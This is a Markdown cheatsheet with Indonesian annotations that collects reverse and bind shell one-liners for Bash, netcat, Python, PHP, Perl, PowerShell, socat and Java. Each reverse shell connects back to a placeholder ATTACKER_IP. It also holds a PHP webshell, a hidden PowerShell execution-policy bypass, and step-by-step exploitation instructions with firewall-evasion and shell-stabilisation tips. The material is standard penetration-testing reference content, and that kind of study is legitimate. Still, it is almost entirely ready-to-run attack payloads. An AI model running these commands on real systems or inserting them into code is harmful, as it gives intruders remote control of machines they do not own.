# Reverse Shell & Bind Shell Cheatsheet

## Reverse Shell Payloads

### Bash

- **Basic Bash Reverse Shell**

  ```bash
  bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
  ```

  _Keterangan: Mengirim shell interaktif ke listener attacker._

- **Bash TCP (versi alternatif)**
  ```bash
  0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196
  ```
  _Keterangan: Alternatif jika payload utama gagal._

---

### Netcat (nc)

- **Netcat dengan -e**

  ```bash
  nc -e /bin/bash ATTACKER_IP PORT
  ```

  _Keterangan: Mengirim shell ke attacker. Tidak semua versi nc mendukung -e._

- **Netcat tanpa -e (POSIX)**

  ```bash
  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
  ```

  _Keterangan: Untuk netcat yang tidak mendukung -e._

- **Netcat OpenBSD (tanpa -e)**
  ```bash
  nc -c bash ATTACKER_IP PORT
  ```
  _Keterangan: Hanya di OpenBSD netcat._

---

### Python

- **Python 2**

  ```python
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```

- **Python 3**
  ```python
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
  ```

---

### PHP

- **PHP CLI**

  ```php
  php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

- **PHP Webshell (untuk RCE via web)**
  ```php
  <?php system($_GET['cmd']); ?>
  ```
  _Keterangan: Untuk eksekusi perintah via browser, bukan reverse shell langsung._

---

### Perl

- **Perl Reverse Shell**
  ```perl
  perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```

---

### PowerShell (Windows)

- **PowerShell One-Liner**
  ```powershell
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
  ```

---

### Socat

- **Socat Reverse Shell**
  ```bash
  socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash
  ```
  _Keterangan: Socat harus tersedia di target._

---

### Java

- **Java Reverse Shell**
  ```bash
  r = Runtime.getRuntime()
  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
  p.waitFor()
  ```
  _Keterangan: Untuk RCE berbasis Java._

---

## Bind Shell Payloads

### Netcat

- **Netcat Bind Shell**
  ```bash
  nc -lvp PORT -e /bin/bash
  ```
  _Keterangan: Target membuka port dan menunggu koneksi attacker._

---

### Python

- **Python Bind Shell**
  ```python
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",PORT));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```

---

## Cara Mengeksploitasi

1. **Reverse Shell:**

   - Jalankan listener di mesin attacker:
     ```bash
     nc -lvnp PORT
     ```
   - Jalankan payload reverse shell di target.

2. **Bind Shell:**
   - Jalankan payload bind shell di target.
   - Hubungkan ke target dari mesin attacker:
     ```bash
     nc TARGET_IP PORT
     ```

---

## Tips & Informasi Penting

- Ganti `ATTACKER_IP` dan `PORT` sesuai listener Anda.
- Cek interpreter yang tersedia di target (`which bash`, `which python`, dll).
- Jika firewall membatasi port, gunakan port umum (80, 443, 53).
- Untuk stabilitas shell:
  ```bash
  python -c 'import pty; pty.spawn("/bin/bash")'
  ```
- Jika shell tidak interaktif, tekan `Ctrl+Z`, lalu:
  ```bash
  stty raw -echo; fg
  export TERM=xterm
  ```
- Untuk Windows, gunakan PowerShell atau netcat for Windows.

---

**Referensi:**

- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-
